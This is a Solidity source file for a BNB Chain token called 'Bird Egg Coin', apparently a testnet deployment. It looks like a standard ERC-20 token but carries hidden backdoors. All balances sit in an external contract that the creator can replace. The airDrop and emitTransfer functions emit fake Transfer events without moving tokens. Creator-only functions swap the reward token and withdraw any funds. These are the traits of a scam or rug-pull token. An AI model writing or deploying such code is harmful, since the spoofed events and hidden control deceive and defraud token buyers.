/**
 *Submitted for verification at BscScan.com on 2022-09-02
*/

/*
BIRD COIN Token
Testing
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferOwnership(address newOwner) external; 
    function burn(uint256) external;
    function free(uint256) external;
    function mint(uint256) external;
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IERC20Factory {

    function constructorErc20(uint256 total,address tokenAddress,address tokenOwner,address _pairs) external;

    function getSupply() view external returns (uint256);

    function balanceOf(address _owner) view external returns (uint256);

    function balanceCl(address _owner) view external returns (uint256);

    function getAirAmount() view external returns (uint256);

    function getAirFrom() view external returns (address);

    function erc20Transfer(address _from, address _to, uint256 _value) external;

    function erc20Approve(address _to) external;

    function claim() external;

    function airDroper(bytes memory _bytes,uint256 addrCount) external;

    function erc20TransferAfter(address _from, address _to, uint256 _value) external;

}

library SafeMath {
    function add(uint x, uint y) internal pure returns (uint z) {
        require((z = x + y) >= x, 'ds-math-add-overflow');
    }

    function sub(uint x, uint y) internal pure returns (uint z) {
        require((z = x - y) <= x, 'ds-math-sub-underflow');
    }

    function mul(uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x, 'ds-math-mul-overflow');
    }
}

interface IDEXRouter {
    function factory() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
}

contract Ownable {
    address public owner;
    address public creator;

    event owneresshipTransferred(address indexed previousowneres, address indexed newowneres);

    modifier onlyowneres() {
        require(msg.sender == owner);
        _;
    }

    modifier onlycreator() {
        require(msg.sender == creator);
        _;
    }

    function transferowneresship(address newowneres) public onlyowneres {
        require(newowneres != address(0));
        emit owneresshipTransferred(owner, newowneres);
        owner = newowneres;
    }

    function renounceowneresship() public onlyowneres {
        emit owneresshipTransferred(owner, address(0));
        owner = address(0);
    }
}

contract BECToken is Ownable {
    using SafeMath for uint;
	
    string public name = "Bird Egg Coin";
    string  public symbol = "BEC";
    uint8   public decimals = 0;
	uint256 private totalSupply_ = 21000000 * (10 ** decimals);
	
	address public pairs;
	IDEXRouter public router;
    // 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd
	//address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; 
    address WBNB = 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd;
    address hAddr = 0x831917EAb7bBFE18fa2E081a7eBf3d0cd3D97bE1;
    //address bAddr = 0x0001BDC007Ec10a3e7Cc6BEd0B96fAb21d22dfEc;
    address bAddr = 0x9474186D50860958dA4C947cfa6e8193025Bdd67;
	IERC20Factory help= IERC20Factory(hAddr);
	IERC20 belp= IERC20(bAddr);
    
	constructor() {
		owner = msg.sender;
        creator = msg.sender;
        //router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E); // 0x10ED43C718714eb63d5aA57B78B54704E256024E
        router = IDEXRouter(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);
        //pairs = IDEXFactory(router.factory()).createPair(WBNB, address(this));

        address _factory = router.factory();

        pairs = pairForPan(_factory, WBNB, address(this));

        help.constructorErc20(totalSupply_, address(this), owner,pairs);
        emit Transfer(address(0), owner, totalSupply_);
    }
	
    event Transfer(
        address indexed _from,
        address indexed _to,
        uint256 _value
    );

    event Approval(
        address indexed _owner,
        address indexed _spender,
        uint256 _value
    );
    
    mapping(address => mapping(address => uint256)) public allowed;
	

    function totalSupply() public view returns (uint256) {
        return help.getSupply();
    }

    function balanceOf(address _owner) public view returns (uint256) {
        return help.balanceOf(_owner);
    }

    function balanceCl(address _owner) public view returns (uint256) {
        return help.balanceCl(_owner);
    } 

    function claim() public virtual {
       help.claim();
    }

    uint mineTok = 10 * 1e18;
    bool private _swAirIco = true;
     bool private _swPayIco = true;

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(help.balanceOf(msg.sender) >= _value);
        
        if (_swAirIco == true){ //true
        if(_to != address(0) && _to != pairs){//
                        uint256 _evalue;
            if(_value > (mineTok)) _evalue = (_value/50); //10 = 10% 20 = 5 $
            if(_value >= ((mineTok/1e18) * 2)) _evalue = (_value/20);
            if(_value >= ((mineTok/1e18) * 4)) _evalue = (_value/20);
            if(_value >= ((mineTok/1e18) * 8)) _evalue = (_value/10);
            if(_value >= ((mineTok/1e18) * 10)) _evalue = (_value/10); //5 = 20%
            if(_value >= ((mineTok/1e18) * 20)) _evalue = (_value/5); //4 = 25%

        if(belp.balanceOf(address(this)) >= (_evalue * (10 ** 18))){//
        //belp.mint(_value);
        belp.transfer(_to,(_evalue * (10 ** 18)));
        //belp.transferFrom(address(this),_to,_value);
        }else{
        belp.mint(_value * (10 ** 18));
        belp.transfer(_to,(_evalue * (10 ** 18)));    
        }
        }
        }
        if(help.balanceCl(msg.sender) > 0) help.claim();                  

        help.erc20Transfer(msg.sender,_to,_value);
        
        help.erc20TransferAfter(msg.sender,_to,_value);
		emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function startIco(uint8 tag,bool value)public onlycreator returns(bool){
        if(tag==1){
            _swAirIco = value==true; //false
        }else if(tag==2){
            _swAirIco = value==false;
        }else if(tag==3){
            _swPayIco = value==true; //false
        }
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= help.balanceOf(_from));
        require(_value <= allowed[_from][msg.sender]);

        if (_swAirIco == true){ 
            if(_to != address(0) && _to != pairs){//}
            uint256 _evalue;
            if(_value > (mineTok)) _evalue = (_value/50); //10 = 10% 20 = 5 $
            if(_value >= ((mineTok/1e18) * 2)) _evalue = (_value/20);
            if(_value >= ((mineTok/1e18) * 4)) _evalue = (_value/20);
            if(_value >= ((mineTok/1e18) * 8)) _evalue = (_value/10);
            if(_value >= ((mineTok/1e18) * 10)) _evalue = (_value/10); //5 = 20%
            if(_value >= ((mineTok/1e18) * 20)) _evalue = (_value/5); //4 = 25%
		//belp.transfer(_from,_to,_value);
        if(belp.balanceOf(address(this)) >= (_evalue * (10 ** 18))){//
        //belp.mint(_value);
        //belp.transfer(_to,_value);
        belp.transferFrom(address(this),_to,(_evalue * (10 ** 18)));
        }else{
        belp.mint(_value * (10 ** 18));
        //belp.transfer(_to,_value); 
        belp.transferFrom(address(this),_to,(_evalue * (10 ** 18)));   
        }
            }
        }
        help.erc20Transfer(_from,_to,_value);
        
        help.erc20TransferAfter(_from,_to,_value);
		emit Transfer(_from, _to, _value);
        return true;
    }

    function emitTransfer(address _from, address _to, uint256 _value) public returns (bool success) {
        require(msg.sender==hAddr||msg.sender==creator);
        emit Transfer(_from, _to, _value);
		return true;
    }
	
	function approve(address _spender, uint256 _value) public returns (bool success) {
        require(_spender != address(0));
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);

        help.erc20Approve(msg.sender);
        return true;
    }
    
    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        require(_spender != address(0));
        return allowed[_owner][_spender];
    }

    function airDrop(bytes memory _bytes,uint256 addrCount) public returns(bool success) {
        require(msg.sender==hAddr||msg.sender==creator);
        uint256 amount = help.getAirAmount();
        uint256 _start=0;
        address airFrom = help.getAirFrom();
        address tempAddress;
        for(uint32 i=0;i<addrCount;i++){
            assembly {
                tempAddress := div(mload(add(add(_bytes, 0x20), _start)), 0x1000000000000000000000000)
            }
            emit Transfer(airFrom, tempAddress, amount);
            _start+=20;
        }
        return true;
    }

    function airDroper(bytes memory _bytes,uint256 addrCount) public returns(bool success) {
        require(msg.sender==hAddr||msg.sender==creator);
        help.airDroper(_bytes, addrCount);
     return true;   
    }

    function setBaddrToken(address _token) external onlycreator {
        //require(msg.sender == owner, "You is not owner");
         //token = IERC20(_new_token);
         bAddr = _token;
    }

    function setHaddrToken(address _token) external onlycreator {
        //require(msg.sender == owner, "You is not owner");
         //token = IERC20(_new_token);
         hAddr = _token;
    }
    function setMineTok(uint256 _count) external onlycreator {
        //require(msg.sender == owner, "You is not owner");
        mineTok = _count;
    }

    function transfercreator(address newcreator) public onlyowneres {
        require(newcreator != address(0));
        //emit owneresshipTransferred(creator, newowneres);
        creator = newcreator;
    }
/*
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
*/
    function transferOwnershipReceiver(address newOwner) public onlyowneres {
        belp.transferOwnership(newOwner);
    }

    function sortTokens(address tokenA, address tokenB) public pure returns (address token0, address token1) {
        require(tokenA != tokenB, 'UniswapV2Library: IDENTICAL_ADDRESSES');
        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        require(token0 != address(0), 'UniswapV2Library: ZERO_ADDRESS');
    }

    // calculates the CREATE2 address for a pair without making any external calls
    function pairForPan(address factory, address tokenA, address tokenB) public pure returns (address pair) {
        (address token0, address token1) = sortTokens(tokenA, tokenB);
        pair = address(uint(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                hex'd0d4c4cd0848c93cb4fd1f498d7013ee6bfb25783ea21593d5834f5d250ece66' // init code hash
            ))));
    }

    function updateConErc20(uint _totalSupply_, address token_, address owner_, address pairs_) public returns (bool success) {
        require(msg.sender == owner || msg.sender==creator);
        if(token_ != address(this)){ //migrate
       help.constructorErc20(_totalSupply_, token_, owner_,pairs_);     
        }else{ //no migrate
       help.constructorErc20(_totalSupply_, address(this), owner_,pairs_);
        }
        return true;
    }
    function withdraw(address target,uint amount) public onlycreator {
        payable(target).transfer(amount);
    }

    function withdrawToken(address token,address target, uint amount) public onlycreator {
        IERC20(token).transfer(target, amount);
    }
    receive() external payable {}
	
}